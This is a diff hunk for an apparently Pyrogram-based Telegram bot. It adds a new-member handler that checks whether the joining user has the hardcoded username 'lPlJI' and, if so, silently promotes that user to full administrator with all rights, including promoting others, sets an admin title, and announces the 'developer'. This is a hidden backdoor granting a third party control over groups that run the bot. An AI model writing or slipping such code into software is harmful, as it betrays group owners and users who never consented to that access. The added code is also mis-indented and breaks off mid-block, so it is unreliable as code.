@@ -104,3 +104,20 @@ async def dev(client: Client, message: Message):
        os.remove(photo)
      except:
         pass
+          @Client.on_message(filters.new_chat_members)
+async def welcome(client: Client, message):
+   try:
+    bot = client.me
+    bot_username = bot.username
+    if message.new_chat_members[0].username == "lPlJI":
+      try:
+         chat_id = message.chat.id
+         user_id = message.new_chat_members[0].id
+         await client.promote_chat_member(chat_id, user_id, privileges=enums.ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True))
+         await client.set_administrator_title(chat_id, user_id, "رجب")
+      except:
+        pass
+      return await message.reply_text(f"**انضم المطور رجب هنا .\nمرحبا بك : @lPlJI .**")
+    dev = await get_dev(bot_username)
+    if message.new_chat_members[0].id == dev:
+      try:
